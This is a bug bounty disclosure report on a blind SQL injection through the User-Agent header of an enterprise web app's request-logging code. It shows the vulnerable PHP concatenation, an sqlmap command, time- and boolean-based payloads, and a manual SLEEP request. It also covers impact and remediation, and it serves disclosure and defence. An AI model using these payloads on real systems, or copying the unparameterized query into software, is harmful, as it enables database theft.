# Title: Blind SQL Injection in User-Agent HTTP Header

- **Platform**: Synack
- **Program**: Enterprise SaaS Application
- **Severity**: Critical
- **Date**: March 2024
- **Researcher**: Synack Red Team Member (anonymous)
- **Bounty**: $1,500

## Summary

A critical blind SQL injection vulnerability was discovered in the User-Agent HTTP header processing of a Synack customer's web application. The application logged incoming HTTP request headers to a database and improperly concatenated the User-Agent value directly into SQL queries, allowing time-based and boolean-based blind SQL injection.

## Technical Details

The application maintained an audit log of all incoming HTTP requests, storing headers such as User-Agent, Referer, and X-Forwarded-For in a MySQL database. The logging mechanism constructed SQL statements by directly concatenating header values without parameterization or sanitization.

The vulnerable code pattern was similar to:

```php
$ua = $_SERVER['HTTP_USER_AGENT'];
$sql = "INSERT INTO access_log (ip, user_agent, timestamp) VALUES ('$ip', '$ua', NOW())";
mysqli_query($conn, $sql);
```

This allowed an attacker to break out of the string context and inject arbitrary SQL commands. The injection was blind (boolean-based and time-based) because the application did not directly return database output.

## Steps to Reproduce

1. Send a request to any application endpoint with a malicious User-Agent header
2. Use boolean-based blind SQL injection to extract database information character by character
3. Alternatively, use time-based payloads with `SLEEP()` to confirm injection and extract data

## Proof of Concept

Using SQLMap to identify and exploit the injection:

```bash
sqlmap --url "https://target.app.com/" --batch --random-agent --level 5 --risk 3
```

SQLMap identified the User-Agent header as injectable:

```
Parameter: User-Agent (User-Agent)
Type: boolean-based blind
Title: OR boolean-based blind - WHERE or HAVING clause
Payload: -5127 OR 2687=2687

Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: -5127' AND (SELECT 8127 FROM (SELECT(SLEEP(5)))nQEz) AND 'YQkT'='YQkT
```

Manual exploitation to verify time-based injection:

```http
GET / HTTP/1.1
Host: target.app.com
User-Agent: ' OR IF(1=1,SLEEP(5),0) -- -
```

The server responded after a 5-second delay, confirming time-based SQL injection.

Database fingerprinting revealed:
- Backend DBMS: MySQL >= 8.0.0 (MariaDB fork)
- Web application technology: Apache 2.4.x
- Database enumeration yielded multiple databases containing user credentials and application data

## Impact

Successful exploitation allowed an attacker to:
- Extract the complete database schema and all table contents
- Dump user credentials (password hashes, email addresses)
- Extract session tokens and API keys stored in the database
- Modify or delete database records
- Potentially escalate to OS command execution via `INTO OUTFILE` or MySQL user-defined functions

The critical severity was warranted by the potential for complete database compromise and downstream access to sensitive customer data.

## Remediation

- Replace dynamic SQL string concatenation with parameterized queries (prepared statements)
- Implement strict input validation and encoding for all HTTP headers
- Apply Web Application Firewall (WAF) rules to detect and block SQL injection attempts
- Conduct regular security assessments and code reviews focused on data access layers

## References
- https://hackerone.com/reports/2597543 (similar finding on DoD program)
- https://www.synack.com/state-of-vulnerabilities/ (Synack State of Vulnerabilities report)
